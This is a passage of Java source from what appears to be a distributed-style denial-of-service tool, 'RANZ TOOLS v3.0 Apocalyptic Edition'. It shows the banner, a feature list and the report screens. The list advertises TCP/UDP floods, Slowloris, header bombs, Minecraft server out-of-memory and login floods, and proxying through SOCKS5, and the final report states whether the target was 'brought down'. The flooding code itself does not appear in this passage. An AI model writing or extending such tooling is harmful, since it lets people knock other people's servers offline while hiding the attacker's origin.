            " \u2588\u2588   \u2588\u2588 \u2588\u2588   \u2588\u2588  \u2588\u2588\u2588\u2588   \u2588\u2588      \u2588\u2588     \u2588\u2588    \u2588\u2588    \u2588\u2588  \u2588\u2588        \u2588\u2588      ",
            " \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588 \u2588\u2588  \u2588\u2588    \u2588\u2588       \u2588\u2588    \u2588\u2588    \u2588\u2588  \u2588\u2588         \u2588\u2588\u2588\u2588\u2588 ",
            " \u2588\u2588   \u2588\u2588 \u2588\u2588   \u2588\u2588  \u2588\u2588  \u2588\u2588 \u2588\u2588         \u2588\u2588    \u2588\u2588    \u2588\u2588  \u2588\u2588              \u2588\u2588",
            " \u2588\u2588   \u2588\u2588 \u2588\u2588   \u2588\u2588  \u2588\u2588   \u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588     \u2588\u2588     \u2588\u2588\u2588\u2588\u2588    \u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588\u2588    \u2588\u2588\u2588\u2588\u2588\u2588 "
        };
        for (String line : bannerLines) {
            System.out.println(YLW + B + line + R);
            Thread.sleep(80);
        }
        System.out.println(GRY + "                          [ APOCALYPTIC EDITION v3.0 ]" + R);
        System.out.println(GRY + "              github.com/ranz-coder | ranzzawok.my.id\n" + R);
        Thread.sleep(300);
        String[] features = {
            CYN + "  [\u2713] " + R + "Layer 4: " + GRN + "TCP NIO, UDP Multi-Socket (10x), Micro PPS" + R,
            CYN + "  [\u2713] " + R + "Layer 7: " + GRN + "HTTP Keep-Alive, Pipelined, Slowloris, Header Bomb" + R,
            CYN + "  [\u2713] " + R + "Minecraft: " + GRN + "OOM, Handshake, Ping, Login Hold, Encryption Flood" + R,
            CYN + "  [\u2713] " + R + "Mixed Mode: " + BRED + B + "ALL VECTORS SIMULTANEOUS" + R,
            CYN + "  [\u2713] " + R + "Title: " + GRN + "PuTTY/xterm live statistics in title bar" + R,
            CYN + "  [\u2713] " + R + "Animation: " + GRN + "RANZ TOOLS / ATTACK SENT animated banner" + R,
            CYN + "  [\u2713] " + R + "Proxy: " + GRN + "SOCKS5 (proxy.txt)" + R,
            CYN + "  [\u2713] " + R + "Server Check: " + GRN + "mcstatus.io API" + R
        };
        for (String f : features) {
            System.out.println(f);
            Thread.sleep(80);
        }
        Thread.sleep(200);
        System.out.println("\n" + YLW + "  Type " + B + "'help'" + R + YLW + " or " + B + "'modes'" + R + YLW + " to begin" + R);
        System.out.println();
        setTitle("RANZ TOOLS v3.0 - Ready");
    }

    static void attackSentAnimation(String t, int p, int m, int d, int th) throws Exception {
        setTitle("RANZ TOOLS - INITIALIZING ATTACK");
        System.out.print("\033[H\033[2J");
        System.out.println(RED + B + "        _  _____ _____  _    ____  _  __  ____  _____ _   _ ____  " + R);
        System.out.println(RED + B + "       / \\|_   _|_   _|/ \\  / ___|| |/ / / ___|| ____| \\ | |  _ \\ " + R);
        System.out.println(RED + B + "      / _ \\ | |   | | / _ \\| |    | ' /  \\___ \\|  _| |  \\| | | | |" + R);
        System.out.println(RED + B + "     / ___ \\| |   | |/ ___ \\ |___ | . \\   ___) | |___| |\\  | |_| |" + R);
        System.out.println(RED + B + "    /_/   \\_\\_|   |_/_/   \\_\\____||_|\\_\\ |____/|_____|_| \\_|____/ " + R);
        System.out.println();
        System.out.println(CYN + "  [+] Target   : " + YLW + t + ":" + p + R);
        System.out.println(CYN + "  [+] Mode     : " + MAG + "[" + MODE_LAYERS[m] + "] " + getModeName(m) + R);
        System.out.println(CYN + "  [+] Threads  : " + GRN + th + R);
        System.out.println(CYN + "  [+] Duration : " + BLU + d + "s" + R);
        System.out.println(CYN + "  [+] Proxy    : " + (useProxy ? YLW + "ON" + R : GRY + "OFF" + R));
        System.out.println();

        // Animated "ATTACK SENT" with loading bar
        System.out.print(GRY + "  [*] Initializing vectors " + R);
        for (int i = 0; i < 15; i++) {
            System.out.print(GRN + "\u2588" + R);
            Thread.sleep(60);
        }
        System.out.println(GRN + B + " [READY]" + R);
        Thread.sleep(200);

        // Flash "ATTACK SENT" 3 times
        for (int i = 0; i < 3; i++) {
            System.out.print("\r" + BRED + B + BLK + "  >>> ATTACK SENT <<< ATTACK SENT <<< ATTACK SENT <<<     " + R);
            Thread.sleep(200);
            System.out.print("\r" + RED + B + "  >>> ATTACK SENT <<< ATTACK SENT <<< ATTACK SENT <<<     " + R);
            Thread.sleep(200);
        }
        System.out.println();
        Thread.sleep(300);
    }

    static void printFinalReport(String t, int p, int m, int d, int th) {
        System.out.print("\033[H\033[2J");
        setTitle("RANZ TOOLS - Attack Finished");
        System.out.println(BGRN + B + "  [\u2713] ATTACK FINISHED" + R);
        System.out.println(GRY + "  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500" + R);
        System.out.println(CYN + "  Target   : " + YLW + t + ":" + p + R);
        System.out.println(CYN + "  Mode     : " + MAG + "[" + MODE_LAYERS[m] + "] " + getModeName(m) + R);
        System.out.println(CYN + "  Duration : " + B + d + "s" + R);
        System.out.println(CYN + "  Threads  : " + GRN + String.format("%,d", th) + R);
        System.out.println(CYN + "  " + GRY + "\u2500\u2500\u2500 PEAK RESULTS \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500" + R);
        System.out.println(CYN + "  Peak GB/s : " + BMAG + String.format("%.2f", (double) peakGb.get()) + R);
        System.out.println(CYN + "  Peak MB/s : " + BCYN + String.format("%.2f", (double) peakMb.get()) + R);
        System.out.println(CYN + "  Peak PPS  : " + B + String.format("%,.0f", (double) peakPps.get()) + R);
        System.out.println(CYN + "  Peak Conn : " + BGRN + String.format("%,.0f", (double) peakConn.get()) + R);
        System.out.println(CYN + "  Peak Err  : " + BRED + String.format("%,.0f", (double) peakErr.get()) + R);
        System.out.println(CYN + "  " + GRY + "\u2500\u2500\u2500 TOTALS \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500" + R);
        System.out.println(CYN + "  Total PPS : " + BYLW + String.format("%,.0f", (double) totalPps.get()) + R);
        System.out.println(CYN + "  Total MB  : " + BYLW + String.format("%.1f", (double) (totalBps.get() / 1048576.0)) + R);
        System.out.println(CYN + "  Total Err : " + BRED + String.format("%,.0f", (double) totalErr.get()) + R);
        System.out.println(CYN + "  " + GRY + "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500" + R);
        System.out.println(CYN + "  Status    : " + (targetUp ? GRN + B + "[\u25CF] TARGET STILL ONLINE" + R : RED + B + "[X] TARGET BROUGHT DOWN" + R));
        System.out.println();
        System.out.println(GRY + "  ranz-coder | github.com/ranz-coder | ranzzawok.my.id" + R);
        System.out.println();
        setTitle("RANZ TOOLS - Ready");
    }
}
